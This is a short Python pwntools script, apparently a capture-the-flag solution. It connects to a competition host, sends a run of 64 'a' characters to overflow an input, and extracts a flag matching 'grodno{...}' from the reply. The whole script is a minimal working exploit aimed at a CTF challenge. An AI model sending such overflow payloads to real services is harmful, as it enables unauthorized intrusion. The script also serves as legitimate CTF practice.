from pwn import *
import re

def main(host,port):
    flag_re='grodno{.*?}'
    # 连接到服务器
    conn = remote(host,port)
    # 发送文件类型到服务器
    conn.recv()
    conn.sendline("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
    req=conn.recv().decode()

    flag=re.findall(flag_re,req)
    print(flag[0])
if __name__ == '__main__':
    host='ctf.mf.grsu.by'
    port='9024'
    main(host,port)
